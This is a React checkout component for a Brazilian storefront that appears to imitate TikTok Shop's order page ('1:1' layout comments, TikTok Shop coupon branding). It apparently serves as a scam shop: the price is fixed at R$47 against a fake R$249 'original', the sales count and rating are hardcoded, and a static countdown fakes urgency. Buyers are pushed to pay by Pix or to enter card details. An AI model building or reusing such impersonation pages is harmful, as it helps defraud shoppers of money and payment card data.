"use client";

import React, { useState, useEffect } from 'react';
import { useLocation, useNavigate } from 'react-router-dom';
import { 
  ArrowLeft, 
  MapPin, 
  ChevronRight, 
  ShieldCheck, 
  Star, 
  Zap, 
  ChevronUp,
  Plus,
  Minus,
  Ticket,
  CreditCard
} from 'lucide-react';
import { Product } from '@/data/products';
import { Button } from '@/components/ui/button';
import NoteDrawer from '@/components/NoteDrawer';
import TikTokCouponDrawer from '@/components/TikTokCouponDrawer';
import PaymentMethodDrawer from '@/components/PaymentMethodDrawer';

const Checkout: React.FC = () => {
  const location = useLocation();
  const navigate = useNavigate();
  const [product, setProduct] = useState<Product | null>(null);
  const [isNoteDrawerOpen, setIsNoteDrawerOpen] = useState(false);
  const [isCouponDrawerOpen, setIsCouponDrawerOpen] = useState(false);
  const [isPaymentDrawerOpen, setIsPaymentDrawerOpen] = useState(false);
  const [orderNote, setOrderNote] = useState("");
  const [quantity, setQuantity] = useState(1);
  const [couponAmount, setCouponAmount] = useState(5);
  const [cardData, setCardData] = useState<any>(null);
  const [paymentMethod, setPaymentMethod] = useState<'card' | 'pix'>('pix');

  useEffect(() => {
    if (location.state?.product) {
      setProduct(location.state.product);
    } else {
      navigate('/');
    }

    if (location.state?.cardAdded && location.state?.cardData) {
      setCardData(location.state.cardData);
      setPaymentMethod('card');
    }
  }, [location, navigate]);

  if (!product) return null;

  const unitPriceNum = 47.00;
  const originalUnitPriceNum = 249.00;
  const subtotal = unitPriceNum * quantity;
  const originalSubtotal = originalUnitPriceNum * quantity;
  const discountTotal = originalSubtotal - subtotal;
  const finalTotal = subtotal - couponAmount;
  const finalTotalStr = finalTotal.toFixed(2).replace('.', ',');

  return (
    <div className="min-h-screen bg-[#F8F8F8] pb-[130px]">
      {/* Header 1:1 */}
      <div className="bg-white border-b h-14 flex flex-col items-center justify-center sticky top-0 z-50 px-4">
        <div className="w-full flex items-center relative">
          <button onClick={() => navigate(-1)} className="absolute left-0">
            <ArrowLeft size={24} className="text-gray-900" />
          </button>
          <div className="w-full text-center">
            <h1 className="text-[17px] font-bold text-gray-900">Resumo do Pedido</h1>
            <div className="flex items-center justify-center text-[#00BFA5] text-[10px] mt-0.5">
              <ShieldCheck size={12} className="mr-1 fill-[#00BFA5]/10" />
              <span>Seus dados estão seguros conosco</span>
            </div>
          </div>
        </div>
      </div>

      <div className="max-w-[600px] mx-auto">
        {/* Seção Endereço */}
        <div className="bg-white p-4 flex items-center justify-between border-b border-gray-100">
          <div className="flex items-center space-x-2">
            <MapPin size={18} className="text-gray-900" />
            <span className="text-[14px] text-gray-900 font-medium">Endereço de envio</span>
          </div>
          <button className="text-[#FF2C55] text-[14px] font-medium" onClick={() => navigate('/adicionar-endereco')}>
            + Adicionar endereço
          </button>
        </div>

        {/* Detalhes da Loja e Produto */}
        <div className="bg-white mt-3 p-4">
          <div className="flex justify-between items-center mb-3">
            <span className="text-[14px] font-bold text-gray-900 uppercase">MAIS MAKE BRASIL</span>
            <button className="text-[13px] text-gray-400 flex items-center" onClick={() => setIsNoteDrawerOpen(true)}>
              Adicionar nota <ChevronRight size={14} className="ml-1" />
            </button>
          </div>
          
          <div className="flex items-center space-x-1.5 text-[12px] mb-4">
            <Star size={14} className="text-[#FFB800] fill-[#FFB800]" />
            <span className="text-[#A0783A] font-bold">Melhor escolha! 28.0K vendido(s) e com nota 4.8/5,0</span>
          </div>

          <div className="flex space-x-3 mb-4">
            <div className="w-[100px] h-[100px] bg-[#F8F8F8] rounded-lg overflow-hidden border border-gray-100 p-1 flex-shrink-0">
              <img src={product.media[0].src} className="w-full h-full object-contain" alt="Thumb" />
            </div>
            <div className="flex-grow flex flex-col justify-start space-y-1">
              <h4 className="text-[13px] font-medium text-gray-900 line-clamp-2 leading-tight">{product.title}</h4>
              <p className="text-[11px] text-gray-400 mb-1">SEM faixa e polvo</p>
              
              {/* Badges Stacked Vertical 1:1 */}
              <div className="flex flex-col space-y-1 mt-0.5">
                <div className="bg-[#FFF1F3] text-[#FF2C55] text-[10px] font-bold px-1.5 py-0.5 rounded-sm flex items-center w-fit">
                  <Zap size={10} className="mr-1 fill-[#FF2C55]" /> Oferta Relâmpago
                </div>
                <div className="bg-[#F8F8F8] text-gray-500 text-[10px] font-medium px-1.5 py-0.5 rounded-sm flex items-center w-fit">
                  <div className="mr-1 w-3 h-3 border border-gray-400 rounded-full flex items-center justify-center">
                    <div className="w-1.5 h-1.5 bg-gray-400 rounded-full"></div>
                  </div>
                  Devolução gratuita
                </div>
              </div>
              
              <div className="flex justify-between items-end mt-2">
                 <div className="flex flex-col">
                   <div className="flex items-center space-x-1">
                     <span className="text-[16px] font-bold text-[#FF2C55]">R$ {unitPriceNum.toFixed(2).replace('.', ',')}</span>
                     <Ticket size={14} className="text-[#FF2C55] fill-[#FF2C55]/20" />
                   </div>
                   <div className="flex items-center space-x-1.5">
                     <span className="text-[11px] text-gray-400 line-through">R$ {originalUnitPriceNum.toFixed(2).replace('.', ',')}</span>
                     <span className="text-[10px] font-bold text-[#FF2C55]">-34%</span>
                   </div>
                 </div>
                 
                 {/* Seletor de Quantidade */}
                 <div className="flex items-center bg-[#F1F1F1] rounded-sm h-8">
                    <button className="w-9 h-full flex items-center justify-center text-gray-600" onClick={() => setQuantity(q => Math.max(1, q - 1))}>
                      <Minus size={14} />
                    </button>
                    <span className="w-9 text-center text-[14px] font-bold text-gray-900 bg-[#F1F1F1]">{quantity}</span>
                    <button className="w-9 h-full flex items-center justify-center text-gray-600" onClick={() => setQuantity(q => q + 1)}>
                      <Plus size={14} />
                    </button>
                 </div>
              </div>
            </div>
          </div>
        </div>

        {/* Cupom TikTok Shop */}
        <div 
          className="bg-white mt-3 p-4 flex items-center justify-between cursor-pointer"
          onClick={() => setIsCouponDrawerOpen(true)}
        >
          <div className="flex items-center space-x-2">
            <Ticket size={20} className="text-[#FF2C55] rotate-[-10deg]" />
            <span className="text-[14px] font-bold text-gray-900">Desconto do TikTok Shop</span>
          </div>
          <div className="flex items-center space-x-1">
            <span className="text-[12px] font-bold text-[#FF2C55] bg-[#FFF1F3] px-2 py-0.5 rounded-sm">
              - R$ {couponAmount.toFixed(2).replace('.', ',')}
            </span>
            <ChevronRight size={16} className="text-gray-300" />
          </div>
        </div>

        {/* Resumo do Pedido */}
        <div className="bg-white mt-3 p-4">
          <h3 className="text-[15px] font-bold text-gray-900 mb-5">Resumo do Pedido</h3>
          <div className="space-y-4">
            <div className="flex justify-between items-center">
              <div className="flex items-center space-x-1.5">
                <span className="text-[14px] text-gray-900 font-bold">Subtotal do produto</span>
                <ChevronUp size={16} className="text-gray-900" />
              </div>
              <span className="text-[14px] font-bold text-gray-900">R$ {subtotal.toFixed(2).replace('.', ',')}</span>
            </div>
            
            <div className="flex justify-between items-center pl-0 text-[13px]">
              <span className="text-gray-500 font-normal">Preço original</span>
              <span className="text-gray-900">R$ {originalSubtotal.toFixed(2).replace('.', ',')}</span>
            </div>
            <div className="flex justify-between items-center pl-0 text-[13px]">
              <span className="text-gray-500 font-normal">Desconto no produto</span>
              <span className="text-[#FF2C55] font-medium">- R$ {discountTotal.toFixed(2).replace('.', ',')}</span>
            </div>
            <div className="flex justify-between items-center pl-0 text-[13px]">
              <span className="text-gray-500 font-normal">Cupons do TikTok Shop</span>
              <span className="text-[#FF2C55] font-medium">- R$ {couponAmount.toFixed(2).replace('.', ',')}</span>
            </div>
            
            <div className="pt-4 border-t flex flex-col items-end">
              <div className="flex items-center space-x-4 w-full justify-between">
                <span className="text-[17px] font-bold text-gray-900">Total</span>
                <span className="text-[17px] font-bold text-gray-900">R$ {finalTotalStr}</span>
              </div>
              <span className="text-[11px] text-gray-400 mt-0.5">Impostos inclusos</span>
            </div>
          </div>
        </div>

        {/* Forma de Pagamento */}
        <div className="bg-white mt-3 p-4">
          <h3 className="text-[14px] font-bold text-gray-900 mb-5">Forma de pagamento</h3>
          
          <div className="space-y-6">
            {cardData ? (
              <div className="flex items-center justify-between cursor-pointer" onClick={() => setPaymentMethod('card')}>
                <div className="flex items-center space-x-3">
                  <div className="bg-gray-100 p-1.5 rounded-sm border">
                    <CreditCard size={18} className="text-gray-600" />
                  </div>
                  <div className="flex flex-col">
                    <span className="text-[14px] text-gray-900 font-medium">Cartão final {cardData.last4}</span>
                    <span className="text-[11px] text-gray-400 uppercase">{cardData.brand}</span>
                  </div>
                </div>
                <div className={`w-5 h-5 rounded-full border-2 flex items-center justify-center ${paymentMethod === 'card' ? 'border-[#FF2C55]' : 'border-gray-200'}`}>
                  {paymentMethod === 'card' && <div className="w-2.5 h-2.5 bg-[#FF2C55] rounded-full"></div>}
                </div>
              </div>
            ) : (
              <div className="flex items-center justify-between cursor-pointer" onClick={() => navigate('/adicionar-cartao')}>
                <div className="flex items-center space-x-3">
                  <div className="bg-gray-100 p-1.5 rounded-sm flex items-center justify-center"><Plus size={14} className="text-gray-400" /></div>
                  <div className="flex flex-col">
                    <span className="text-[14px] text-gray-900 font-medium">Cartão de crédito</span>
                    <div className="flex gap-2 mt-2">
                      <img src="https://upload.wikimedia.org/wikipedia/commons/2/2a/Mastercard-logo.svg" className="h-4" alt="Mastercard" />
                      <img src="https://images.seeklogo.com/logo-png/14/1/visa-logo-png_seeklogo-149698.png" className="h-4" alt="Visa" />
                      <img src="https://images.seeklogo.com/logo-png/20/1/elo-logo-png_seeklogo-205447.png" className="h-4" alt="Elo" />
                      <img src="https://upload.wikimedia.org/wikipedia/commons/3/30/American_Express_logo.svg" className="h-4" alt="Amex" />
                    </div>
                  </div>
                </div>
                <ChevronRight size={18} className="text-gray-300" />
              </div>
            )}

            {/* Banner de Economia */}
            <div className="bg-[#FFF1F3] p-3 flex items-center space-x-2 rounded-sm">
              <span className="text-[16px]">😊</span>
              <span className="text-[12px] text-[#FF2C55] font-medium leading-tight">
                Você está economizando R$ {(discountTotal + couponAmount).toFixed(2).replace('.', ',')} nesse pedido.
              </span>
            </div>
          </div>
        </div>
      </div>

      {/* Footer Fixo */}
      <div className="fixed bottom-0 left-0 right-0 bg-white border-t p-4 z-50">
        <div className="max-w-[600px] mx-auto">
          <div className="flex justify-between items-center mb-3 px-1">
            <span className="text-[16px] font-bold text-gray-900">Total (1 item)</span>
            <span className="text-[19px] font-bold text-[#FF2C55]">R$ {finalTotalStr}</span>
          </div>
          <Button 
            className="w-full bg-[#FF2C55] hover:bg-[#E0254B] text-white font-bold rounded-full h-[54px] flex flex-col items-center justify-center space-y-0 shadow-none border-none"
            onClick={() => {
              if (paymentMethod === 'pix') {
                navigate('/pix-pagamento', { state: { product } });
              } else {
                window.location.href = '/checkout.html';
              }
            }}
          >
            <span className="text-[17px]">Fazer pedido</span>
            <span className="text-[11px] font-medium opacity-90">O cupom expira em 02:43:46</span>
          </Button>
        </div>
      </div>

      <NoteDrawer isOpen={isNoteDrawerOpen} onClose={() => setIsNoteDrawerOpen(false)} onSave={setOrderNote} initialNote={orderNote} />
      <TikTokCouponDrawer isOpen={isCouponDrawerOpen} onClose={() => setIsCouponDrawerOpen(false)} onSelect={setCouponAmount} selectedAmount={couponAmount} />
      <PaymentMethodDrawer 
        isOpen={isPaymentDrawerOpen} 
        onClose={() => setIsPaymentDrawerOpen(false)} 
        onSelectMethod={setPaymentMethod} 
        onAddCard={() => navigate('/adicionar-cartao')}
        total={finalTotalStr}
      />
    </div>
  );
};

export default Checkout;